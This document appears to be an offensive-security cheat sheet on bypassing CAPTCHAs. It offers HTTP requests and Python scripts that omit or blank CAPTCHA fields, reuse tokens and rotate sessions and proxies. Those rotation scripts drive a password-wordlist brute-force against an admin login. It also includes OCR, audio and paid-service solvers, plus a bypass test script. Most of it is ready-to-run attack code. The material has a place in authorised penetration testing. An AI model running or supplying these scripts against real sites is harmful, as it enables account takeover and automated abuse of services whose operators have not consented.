---
tags:
  - high
  - logic
---

# CAPTCHA Bypass

Bypass CAPTCHAs via parameter omission, value reuse, OCR automation, or third-party solving services.

## Quick Test

```http
# Remove parameter entirely
POST /login HTTP/1.1
username=admin&password=test

# Or send empty
captcha=
captcha[]=
g-recaptcha-response=
```

## Attack Vectors

### 1. Parameter Manipulation

**Omit CAPTCHA parameter:**
```http
# Original
POST /login
username=admin&password=test&captcha=abc123&captcha_id=xyz

# Bypass - remove captcha params
POST /login
username=admin&password=test
```

**Empty/invalid values:**
```http
captcha=
captcha[]=
captcha=null
captcha=undefined
captcha=0
captcha=false
g-recaptcha-response=
h-captcha-response=
```

### 2. Value Reuse

**Session reuse:**
```python
session = requests.Session()
captcha = solve_captcha()
for password in wordlist:
    resp = session.post('/login', data={
        'user': 'admin',
        'pass': password,
        'captcha': captcha  # Same token reused
    })
```

**Cross-session reuse:**
```http
# Token from session A may work in session B
# if not properly bound to session
```

### 3. Source Code Inspection

**Extract value from HTML:**
```python
import re
html = requests.get('/login').text
# Math CAPTCHA answer sometimes embedded
captcha = re.search(r'name="captcha_answer" value="(\d+)"', html)
```

**Cookie analysis:**
```python
cookies = session.cookies.get_dict()
if 'captcha_value' in cookies:
    answer = base64.b64decode(cookies['captcha_value'])
```

### 4. HTTP Method Switching

```http
# POST with CAPTCHA
POST /contact
message=test&captcha=required

# Try GET (may bypass validation)
GET /contact?message=test
```

### 5. Rate Limit Exploitation

**Session rotation:**
```python
for attempt in range(1000):
    session = requests.Session()  # New session per attempt
    # CAPTCHA only triggers after N failures per session
    try_login(session, 'admin', passwords[attempt])
```

**IP rotation:**
```python
proxies = ['proxy1:8080', 'proxy2:8080', ...]
for i, password in enumerate(wordlist):
    proxy = proxies[i % len(proxies)]
    try_login(password, proxy=proxy)
```

### 6. Math CAPTCHA Automation

```python
import re

def solve_math_captcha(html):
    match = re.search(r'What is (\d+) ([+\-*/]) (\d+)', html)
    if match:
        a, op, b = int(match[1]), match[2], int(match[3])
        ops = {'+': lambda x,y: x+y, '-': lambda x,y: x-y,
               '*': lambda x,y: x*y, '/': lambda x,y: x//y}
        return ops[op](a, b)
```

### 7. Image CAPTCHA Analysis

**Limited image set (hash matching):**
```python
import hashlib

known = {
    'abc123hash': 'XY7K',
    'def456hash': 'M9PQ',
}

def solve(image_bytes):
    h = hashlib.md5(image_bytes).hexdigest()
    return known.get(h, None)
```

**OCR attack:**
```python
import pytesseract
from PIL import Image

def ocr_solve(image_path):
    img = Image.open(image_path)
    text = pytesseract.image_to_string(img, config='--psm 7')
    return text.strip()
```

### 8. Audio CAPTCHA

```python
import speech_recognition as sr

def solve_audio(audio_file):
    r = sr.Recognizer()
    with sr.AudioFile(audio_file) as source:
        audio = r.record(source)
    return r.recognize_google(audio)
```

### 9. Third-Party Services

**2Captcha API:**
```python
import requests

def solve_recaptcha(site_key, page_url):
    resp = requests.post('http://2captcha.com/in.php', data={
        'key': API_KEY,
        'method': 'userrecaptcha',
        'googlekey': site_key,
        'pageurl': page_url
    })
    task_id = resp.text.split('|')[1]
    
    import time
    for _ in range(30):
        time.sleep(5)
        result = requests.get(f'http://2captcha.com/res.php?key={API_KEY}&action=get&id={task_id}')
        if 'CAPCHA_NOT_READY' not in result.text:
            return result.text.split('|')[1]
```

**Services:** 2Captcha, CapSolver, Anti-Captcha

### 10. Client-Side Bypass

**Disable JavaScript:**
```python
# Some sites skip CAPTCHA without JS
session.headers['User-Agent'] = 'curl/7.68.0'
```

**DOM manipulation:**
```javascript
// If validation is client-side only
document.querySelector('form').submit();
document.querySelector('[name="captcha"]').removeAttribute('required');
```

## Quick Test Script

```python
import requests

def test_captcha_bypass(url, form_data):
    tests = [
        {},                    # No captcha param
        {'captcha': ''},       # Empty
        {'captcha[]': ''},     # Array
        {'captcha': 'null'},   # Null string
    ]
    
    for extra in tests:
        data = {**form_data, **extra}
        resp = requests.post(url, data=data)
        if 'captcha' not in resp.text.lower():
            print(f"Potential bypass: {extra}")
```

## Tools

| Tool | Purpose |
|------|---------|
| **Tesseract OCR** | Open-source OCR |
| **2Captcha** | Paid solving service |
| **CapSolver** | AI CAPTCHA solving |
| **Anti-Captcha** | Human solving service |
| **Buster** | Browser extension for audio |
| **SpeechRecognition** | Python audio-to-text |

## Checklist

- [ ] Remove CAPTCHA parameter entirely
- [ ] Send empty CAPTCHA value
- [ ] Try array syntax (captcha[]=)
- [ ] Test token reuse across requests
- [ ] Check for CAPTCHA value in HTML/cookies
- [ ] Try HTTP method switching
- [ ] Test rate limit with session/IP rotation
- [ ] Check for client-side only validation
- [ ] Test without JavaScript enabled
